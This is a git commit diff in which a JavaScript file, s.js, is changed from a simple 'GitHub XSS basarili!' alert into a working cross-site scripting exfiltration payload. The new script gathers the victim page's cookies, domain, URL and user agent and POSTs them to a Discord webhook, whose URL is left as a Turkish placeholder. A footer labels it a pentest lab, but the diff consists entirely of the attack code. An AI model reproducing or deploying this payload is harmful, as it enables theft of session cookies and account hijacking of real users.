8468ff8fb56c459040de4c31b4e5eb5bbb005d08
MuhendisCocuk <glumapolys@gmail.com>
2026-04-10 15:47:02 +0300

    b

--- s.js
+++ s.js
@@ -1,1 +1,24 @@
-alert('GitHub XSS basarili!')
+// GitHub: s.js
+const webhookURL = "BURAYA_DISCORD_WEBHOOK_URL_GELECEK";
+
+const data = {
+    username: "XSS Bot - Kaptan Pengu",
+    content: "🚀 **Yeni Veri Sızdırıldı!**",
+    embeds: [{
+        title: "Saldırı Detayları",
+        color: 16711680, // Kırmızı
+        fields: [
+            { name: "Domain", value: document.domain, inline: true },
+            { name: "Sayfa", value: location.href, inline: true },
+            { name: "Çerezler (Cookies)", value: "```" + (document.cookie || "Yok/HttpOnly") + "```" },
+            { name: "Kullanıcı Aracısı", value: navigator.userAgent }
+        ],
+        footer: { text: "CachyOS Pentest Lab" }
+    }]
+};
+
+fetch(webhookURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+});
